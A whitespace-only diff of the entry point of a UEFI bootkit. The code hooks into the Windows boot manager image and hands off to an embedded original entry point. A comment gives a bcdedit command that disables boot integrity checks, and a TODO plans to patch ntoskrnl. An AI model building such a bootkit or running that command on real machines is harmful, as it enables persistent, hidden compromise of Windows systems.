@@ -5,7 +5,7 @@ extern "C" EFI_IMAGE_DOS_HEADER __ImageBase;
 EFI_STATUS EFIAPI EfiEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
 {
 	InitializeGlobals(ImageHandle, SystemTable);
-	
+
 	EFI_LOADED_IMAGE* bootmgfwImage = nullptr;
 	EFI_STATUS status = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (void**)&bootmgfwImage);
 	if (EFI_ERROR(status))
@@ -25,7 +25,7 @@ EFI_STATUS EFIAPI EfiEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable
 	// Alternative: bcdedit /store BCD /set {bootmgr} nointegritychecks on
 
 	// TODO: hook ImgArchStartBootApplication/BootServices to patch ntoskrnl
-	
+
 	// Call the original entry point (embedded in the bootkit PE)
 	auto pnth = (EFI_IMAGE_NT_HEADERS64*)((UINT8*)&__ImageBase + __ImageBase.e_lfanew);
 	auto originalEntryRva = pnth->OptionalHeader.AddressOfEntryPoint;
